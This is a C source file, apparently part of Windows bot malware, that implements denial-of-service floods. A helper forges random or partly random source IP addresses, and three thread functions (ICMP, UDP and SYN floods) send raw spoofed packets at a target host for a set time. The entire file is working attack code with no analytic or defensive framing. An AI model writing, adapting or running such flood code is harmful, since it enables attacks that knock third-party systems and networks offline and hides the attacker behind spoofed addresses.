#include "include.h"
#include "extern.h"

unsigned long getspoof(bool fullspoof)
/* get a random spoof ip, if fullspoof is true then make the whole thing random,
 * otherwise just spoof the class D of the ip */
{
	int a;
	int b;
	int c;
	int d;
	char spoof[16];
	sscanf(global_ip, "%d.%d.%d.%d", &a, &b, &c, &d);
	do
	{
		if(fullspoof)
			_snprintf(spoof, sizeof(spoof), "%d.%d.%d.%d", rrand(0, 255), rrand(0, 255), rrand(0, 255), rrand(0, 255));
		else
			_snprintf(spoof, sizeof(spoof), "%d.%d.%d.%d", a, b, c, rrand(0, 255));
	}
	while(!strcmp(global_ip, spoof));
	return inet_addr(spoof);
}

DWORD WINAPI icmpflood(void *param)
/* floods target with ICMP packets */
{
	int started;
	int elapsed;
	int flag = 1;
	unsigned long ip;
	struct icmps icmp = *(struct icmps *)param;
	struct icmps *picmp = (struct icmps *)param;
	struct sockaddr_in sin;
	struct icmpp p;
	SOCKET sock;
	picmp->gotinfo = true;
	srand(GetTickCount());
	if(isip(icmp.host))
		ip = inet_addr(icmp.host);
	else
		ip = resolvehost(icmp.host);
	if(!ip)
		ExitThread(0);
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
	{
		clearthread(icmp.tnum);
		ExitThread(0);
	}
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1)
	{
		closesocket(sock);
		clearthread(icmp.tnum);
		ExitThread(0);
	}
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	started = GetTickCount() / 1000;
	while(1) 
	{
		makeicmp(&p, getspoof(icmp.fullspoof), ip);
		if(sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		{
			closesocket(sock);
			clearthread(icmp.tnum);
			ExitThread(0);
		}
		elapsed = GetTickCount() / 1000 - started;
		if(elapsed >= icmp.time)
			break;
	}
	closesocket(sock);
	clearthread(icmp.tnum);
    ExitThread(0);
return 0;
}

DWORD WINAPI udpflood(void *param)
/* floods target with UDP packets */
{
	int started;
	int elapsed;
	int flag = 1;
	unsigned long ip;
	struct udps udp = *(struct udps *)param;
	struct udps *pudp = (struct udps *)param;
	struct sockaddr_in sin;
	struct udpp p;
	SOCKET sock;
	pudp->gotinfo = true;
	srand(GetTickCount());
	if(isip(udp.host))
		ip = inet_addr(udp.host);
	else
		ip = resolvehost(udp.host);
	if(!ip)
		ExitThread(0);
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
	{
		clearthread(udp.tnum);
		ExitThread(0);
	}
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1)
	{
		closesocket(sock);
		clearthread(udp.tnum);
		ExitThread(0);
	}
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	started = GetTickCount() / 1000;
	while(1) 
	{
		makeudp(&p, getspoof(udp.fullspoof), ip, rrand(1, 65535), (udp.port) ? udp.port : rrand(1, 65535));
		/* if dest port is 0, use a random one */
		if(sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		{
			closesocket(sock);
			clearthread(udp.tnum);
			ExitThread(0);
		}
		elapsed = GetTickCount() / 1000 - started;
		if(elapsed >= udp.time)
			break;
	}
	closesocket(sock);
	clearthread(udp.tnum);
	ExitThread(0);
return 0;
}

DWORD WINAPI synflood(void *param)
/* floods target with SYN packets */
{
	int started;
	int elapsed;
	int flag = 1;
	unsigned long ip;
	struct syns syn = *(struct syns *)param;
	struct syns *psyn = (struct syns *)param;
	struct sockaddr_in sin;
	struct tcpp p;
	SOCKET sock;
	psyn->gotinfo = true;
	srand(GetTickCount());
	if(isip(syn.host))
		ip = inet_addr(syn.host);
	else
		ip = resolvehost(syn.host);
	if(!ip)
		ExitThread(0);
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
	{
		clearthread(syn.tnum);
		ExitThread(0);
	}
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1)
	{
		closesocket(sock);
		clearthread(syn.tnum);
		ExitThread(0);
	}
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	started = GetTickCount() / 1000;
	while(1)
	{
		makesyn(&p, getspoof(syn.fullspoof), ip, rrand(1, 65535), (syn.port) ? syn.port : rrand(1, 65535));
		/* if dest port is 0, use a random one */
		if(sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		{
			closesocket(sock);
			clearthread(syn.tnum);
			ExitThread(0);
		}
		elapsed = GetTickCount() / 1000 - started;
		if(elapsed >= syn.time)
			break;
	}
	closesocket(sock);
	clearthread(syn.tnum);
	ExitThread(0);
return 0;
}